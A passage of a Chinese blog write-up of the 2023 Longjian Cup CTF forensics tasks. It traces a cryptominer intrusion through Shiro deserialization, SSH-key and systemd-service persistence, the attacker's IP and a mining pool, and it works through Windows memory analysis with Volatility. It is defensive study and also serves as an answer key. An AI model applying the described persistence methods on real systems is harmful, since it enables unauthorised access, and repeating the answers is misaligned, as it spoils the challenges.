

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="cvbxy">
  <meta name="keywords" content="">
  
    <meta name="description" content="2023陇剑杯比赛记录+复盘">
<meta property="og:type" content="article">
<meta property="og:title" content="2023陇剑杯">
<meta property="og:url" content="https://cvbxy.github.io/2024/06/20/2023%E9%99%87%E5%89%91%E6%9D%AF/index.html">
<meta property="og:site_name" content="cvbxy&#39;s blog">
<meta property="og:description" content="2023陇剑杯比赛记录+复盘">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702667214-935e885f-38f0-400d-a573-f3e1ed55995b.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702694143-b64ae039-ff7a-4db9-b653-2c9915a06581.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702702919-374abd92-8660-4745-a746-4acc52c5498a.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702718567-ba742dfd-a9f9-4cd5-8d6e-91ca6fbd6d0d.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702725580-c76af453-2010-4139-aada-e4001b56c62c.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702733168-ca7cd749-4ef2-4ab0-9074-308d03ffc582.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702764622-f2a25ca1-8977-44a5-93f4-ba999244681d.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702769449-4b362aa3-91d7-47bc-bfae-ab713370303b.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702777901-0bf41029-6ff6-4bf8-8bf3-c4c3dd822c18.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702806491-657b94a1-6abf-4ee2-b8ed-bec9c46ea11d.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703025431-92091c6d-335e-436a-9048-3a16a15637a3.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703038999-16246204-6664-4b2a-b282-b065e5acefd4.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703063960-74f4498a-259f-44f3-995b-bf41b79996c1.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703086415-03113fcc-53e5-4425-96f3-575373f24361.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703095127-99e72356-e47f-4a8e-a71c-9c67c6197040.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703104975-b81f6cca-f21c-43b8-8a68-e0d903898cb9.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703127789-89b5a477-3b81-4fa1-a6c0-5ac699af868b.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703131576-01e40753-46ca-4077-b838-7de139778185.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703834124-8259ba3f-abf1-44dc-8166-e7a8143642f2.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702419897-49846437-f65c-48a8-ae68-7db6ba165597.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702448265-9bc36267-9762-4230-8b5f-70b92f65398f.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702481879-a8a2cf32-fc78-4f54-a6e1-3f0327c3c75b.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702488479-9d12efb0-7d36-4b77-af48-1e710b2e618c.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702499328-b791fae3-15b8-4d4a-bb02-ad573ee47971.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702515749-443a37e2-2693-41d0-935e-256a3d967e83.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702542826-5303883b-789f-45d3-b792-a0fc003f1be0.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702547317-7b064922-810c-44a1-be6a-64cb0e81c2a2.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702560197-d33954ed-7069-4104-a063-0f0007006005.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702574008-ae77f0d4-24dd-4704-a775-bb0002e4a8a8.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702582745-b2a8f38d-2c78-4db7-b4e9-9361fc974543.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702590445-624fa4d5-5ecf-4d75-aba1-dde22d8a3de3.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702606340-072ceb17-ed3c-4842-8f76-c86898040c1d.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702613793-472fe8bb-4dd6-4502-bcab-a697737cc1ce.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702630964-bc6a7be9-1814-414d-803c-17a89d8694ad.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702640527-57ad9ae6-d624-4469-81f6-0726219f4d5d.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702646964-eceb4f26-62fe-4c44-b0e9-5625ec702c9e.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702653879-87ff98c8-5fd8-4d10-9f74-3dbde04fdbec.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702833953-c34a3ce7-2d43-4227-b4f1-8668bfb73e14.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702843484-85d4ebb0-ba6d-4244-80d4-e35267989656.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702847668-89d66c34-bbd6-48af-8eb8-05a1fb875994.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702855620-005b1c4e-5b9b-4fcd-b7c3-a46fcd60cb25.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702874392-72852096-7358-4291-bfd7-d24657e9743e.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702880040-45d10690-d637-4c11-996c-37e3a18b9d16.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702886594-bda6ea38-c34e-4209-8e21-f2fca61af104.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702897671-69f3b436-cf11-47e2-a385-c0ccd67650a1.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702905758-986ecb5b-e4b4-4303-9168-a99960b98fb9.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702910734-f3d481de-efaf-43ce-a609-992b2efd07db.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702919743-6d3c40a5-5295-4982-9b98-4dae674825f2.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702934817-d45d1558-817d-416a-9510-24dfdf33e40d.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702943361-1652ce9e-baf5-4081-b0dc-77951dd500b6.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702952034-38bf593d-97df-493b-8bd0-d3a178786ca9.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702957565-9765a518-f267-4d8f-9ef5-3b557a02bcb5.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702974564-a746e058-cf60-43d7-a9a2-f7510acc86ab.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702994529-9830f75f-7b7f-4ef0-ae9f-7ae38b8bf1b4.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706702999654-0f01fa01-42cf-4599-a669-b88426924dab.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703144845-1483be00-b33e-4a6e-b5c1-f857dc9e49cd.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703154714-67ec0da2-6acb-444d-8558-cb383c1d2a1a.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703175025-b0fc873b-b1e2-4113-a11c-00ef50f58d6e.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703197592-7d959f7e-4ab3-485d-b190-8a8f634915d6.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703204743-8148a087-7d28-4109-ba6e-babebcc2f383.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703210817-ada8bc00-c5e1-422b-a882-020d33a4f28f.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703225661-023e8bc8-6ada-4a8c-957d-27f1837be577.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703244498-19ec00df-bdab-4316-b5ce-90ca52d7bcb0.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703252303-8b339ef9-732e-44f0-9968-19c57f1ac293.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703259335-89e9d386-0df3-4200-b6da-9451f6a05450.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703275522-526b7853-41ec-474d-bb5a-f3b31eb1cca7.png">
<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/1706703281489-091416f8-08e8-478d-90d2-b883921a4170.png">
<meta property="article:published_time" content="2024-06-20T08:06:06.000Z">
<meta property="article:modified_time" content="2024-06-21T08:02:08.286Z">
<meta property="article:author" content="cvbxy">
<meta property="article:tag" content="流量分析">
<meta property="article:tag" content="取证">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cvbxy.github.io/img/blogimg/1706702667214-935e885f-38f0-400d-a573-f3e1ed55995b.png">
  
  
  
  <title>2023陇剑杯 - cvbxy&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/mac.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"cvbxy.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="cvbxy's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>cvbxy&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2023陇剑杯"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-20 16:06" pubdate>
          2024年6月20日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          13k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          109 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">2023陇剑杯</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h3><blockquote>
<p>你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root&#x2F;IncidentResponsePasswd）<br>挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>本题附件见于平台公告的IR.zip，解压密码为f0b1ba11478343f404666c355919de3f<br>echo -n ‘&#x2F;etc&#x2F;redis&#x2F;redis-server’|md5sum|cut -d ‘ ‘ -f1<br>6f72038a870f05cbf923633066e48881</p>
</blockquote>
<p>对ova文件用r-studio进行恢复，把vmdk文件提取出来</p>
<p><img src="/img/blogimg/1706702667214-935e885f-38f0-400d-a573-f3e1ed55995b.png" srcset="/img/loading.gif" lazyload></p>
<p>用DiskGenius恢复vmdk里面的文件</p>
<p><img src="/img/blogimg/1706702694143-b64ae039-ff7a-4db9-b653-2c9915a06581.png" srcset="/img/loading.gif" lazyload></p>
<p>ova导入虚拟机，<code>ps -ef</code> 查看运行的进程</p>
<p><img src="/img/blogimg/1706702702919-374abd92-8660-4745-a746-4acc52c5498a.png" srcset="/img/loading.gif" lazyload></p>
<p>发现&#x2F;etc&#x2F;redis目录下有可疑文件</p>
<p><img src="/img/blogimg/1706702718567-ba742dfd-a9f9-4cd5-8d6e-91ca6fbd6d0d.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘donate.v2.xmrig.com’|md5sum|cut -d ‘ ‘ -f1<br>3fca20bb92d0ed67714e68704a0a4503</p>
</blockquote>
<p><img src="/img/blogimg/1706702725580-c76af453-2010-4139-aada-e4001b56c62c.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>题目提示：答案md5值前两位为3e<br>echo -n ‘shirodeserialization’|md5sum|cut -d ‘ ‘ -f1<br>3ee726cb32f87a15d22fe55fa04c4dcd</p>
</blockquote>
<p>&#x2F;home&#x2F;app目录下的log里面可以找到shiro的报错，应该是shiro反序列化</p>
<p><img src="/img/blogimg/1706702733168-ca7cd749-4ef2-4ab0-9074-308d03ffc582.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘81.70.166.3’|md5sum|cut -d ‘ ‘ -f1<br>c76b4b1a5e8c9e7751af4684c6a8b2c9</p>
</blockquote>
<p>查看日志</p>
<p><img src="/img/blogimg/1706702764622-f2a25ca1-8977-44a5-93f4-ba999244681d.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/blogimg/1706702769449-4b362aa3-91d7-47bc-bfae-ab713370303b.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘mozilla&#x2F;5.0(compatible;baiduspider&#x2F;2.0;+<a target="_blank" rel="noopener" href="http://www.baidu.com/search/spider.html)'|md5sum|cut">http://www.baidu.com/search/spider.html)&#39;|md5sum|cut</a> -d ‘ ‘ -f1<br>6ba8458f11f4044cce7a621c085bb3c6</p>
</blockquote>
<p>日志文件末尾的POST包</p>
<p><img src="/img/blogimg/1706702777901-0bf41029-6ff6-4bf8-8bf3-c4c3dd822c18.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘&#x2F;root&#x2F;.ssh&#x2F;authorized_keys’|md5sum|cut -d ‘ ‘ -f1<br>a1fa1b5aeb1f97340032971c342c4258</p>
</blockquote>
<p>在流量包里面发现了修改root的authorized_keys</p>
<blockquote>
<p>攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n ‘strings’|md5sum|cut -d ‘ ‘ -f1获取md5值作为答案）<br>echo -n ‘&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;redis.service’|md5sum|cut -d ‘ ‘ -f1<br>b2c5af8ce08753894540331e5a947d35</p>
</blockquote>
<p>查找所有与redis相关的文件，看到一个疑似开机自启的服务</p>
<p><img src="/img/blogimg/1706702806491-657b94a1-6abf-4ee2-b8ed-bec9c46ea11d.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h3><blockquote>
<p>磁盘中的key是多少？<br>本题附件见于平台公告的BF.zip，解压密码为4cf611fce4a2fec305e54c2766b7c860<br>2e80307085fd2b5c49c968c323ee25d5</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw imageinfo</span><br>Volatility Foundation Volatility Framework 2.6.1<br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418<br>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br>                     AS Layer2 : FileAddressSpace (/tmp/baby.raw)<br>                      PAE <span class="hljs-built_in">type</span> : No PAE<br>                           DTB : 0x187000L<br>                          KDBG : 0xf800040420a0L<br>          Number of Processors : 4<br>     Image Type (Service Pack) : 1<br>                KPCR <span class="hljs-keyword">for</span> CPU 0 : 0xfffff80004043d00L<br>                KPCR <span class="hljs-keyword">for</span> CPU 1 : 0xfffff880009ef000L<br>                KPCR <span class="hljs-keyword">for</span> CPU 2 : 0xfffff88004569000L<br>                KPCR <span class="hljs-keyword">for</span> CPU 3 : 0xfffff880045df000L<br>             KUSER_SHARED_DATA : 0xfffff78000000000L<br>           Image <span class="hljs-built_in">date</span> and time : 2022-05-29 12:14:16 UTC+0000<br>     Image <span class="hljs-built_in">local</span> <span class="hljs-built_in">date</span> and time : 2022-05-29 20:14:16 +0800<br><br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 filescan | grep &quot;key.txt&quot; </span><br>Volatility Foundation Volatility Framework 2.6.1<br>0x000000003df80070      2      0 -W-rwd \Device\HarddiskVolume2\Users\admin\AppData\Local\Temp\vmware-admin\VMwareDnD\abafa01a\key.txt<br>0x000000003df94070     16      0 RW---- \Device\HarddiskVolume3\key.txt<br><br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 dumpfiles -Q &#x27;0x000000003df80070&#x27; -D /tmp</span><br>Volatility Foundation Volatility Framework 2.6.1<br>DataSectionObject 0x3df80070   None   \Device\HarddiskVolume2\Users\admin\AppData\Local\Temp\vmware-admin\VMwareDnD\abafa01a\key.txt<br><br>┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># cat file.None.0xfffffa800e7f96f0.dat </span><br>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d<br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703025431-92091c6d-335e-436a-9048-3a16a15637a3.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>电脑中正在运行的计算器的运行结果是多少？<br>7598632541</p>
</blockquote>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 windows &gt; dump</span><br><span class="hljs-comment"># windoes:Print Desktop Windows (verbose details)</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/1706703038999-16246204-6664-4b2a-b282-b065e5acefd4.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─<span class="hljs-comment"># vol.py -f baby.raw --profile=Win7SP1x64 psscan        </span><br>Volatility Foundation Volatility Framework 2.6.1<br>Offset(P)          Name                PID   PPID PDB                Time created                   Time exited                   <br>------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------<br>0x000000003dd2cb30 calc.exe           2844   2552 0x000000000eb93000 2022-05-29 11:50:36 UTC+0000                                 <br>0x000000003ddbeb30 StikyNot.exe       2968   2552 0x00000000366e7000 2022-05-29 12:05:25 UTC+0000                                 <br>0x000000003de20910 explorer.exe       2552   2516 0x0000000032058000 2022-04-14 11:14:06 UTC+0000                                 <br>0x000000003de22060 dwm.exe            2528    884 0x0000000031ee7000 2022-04-14 11:14:06 UTC+0000                                 <br>0x000000003de4b6b0 WmiPrvSE.exe       2312    644 0x0000000032adc000 2022-04-14 11:14:03 UTC+0000                                 <br>0x000000003df62890 vmtoolsd.exe       2660   2552 0x000000002b715000 2022-04-14 11:14:07 UTC+0000                                 <br>0x000000003dfda910 SearchIndexer.     2884    520 0x0000000026bf8000 2022-04-14 11:14:13 UTC+0000                                 <br>0x000000003e014060 rundll32.exe       2104    644 0x0000000000c26000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e021b30 vmtoolsd.exe       1544    520 0x000000000dd3b000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e075b30 taskhost.exe       1696    520 0x000000000a03b000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e10f630 sppsvc.exe         1952    520 0x0000000007832000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e148820 svchost.exe        2016    520 0x0000000007a03000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e197630 dllhost.exe        1792    520 0x0000000006b10000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e243b30 spoolsv.exe        1148    520 0x00000000122cf000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e275b30 svchost.exe        1180    520 0x0000000011b4d000 2022-04-14 11:14:01 UTC+0000                                 <br>0x000000003e302440 taskhost.exe       1748    520 0x0000000021982000 2022-05-29 11:43:51 UTC+0000                                 <br>0x000000003e335b30 svchost.exe        1320    520 0x0000000010492000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e3aab30 VGAuthService.     1404    520 0x000000000f15c000 2022-04-14 11:14:02 UTC+0000                                 <br>0x000000003e3f9400 svchost.exe        2976    520 0x000000000bfc6000 2022-05-29 11:44:06 UTC+0000                                 <br>0x000000003e430360 wmpnetwk.exe       1064    520 0x0000000014c8c000 2022-05-29 11:44:07 UTC+0000                                 <br>0x000000003e436b30 svchost.exe         644    520 0x00000000185ed000 2022-04-14 11:14:01 UTC+0000                                 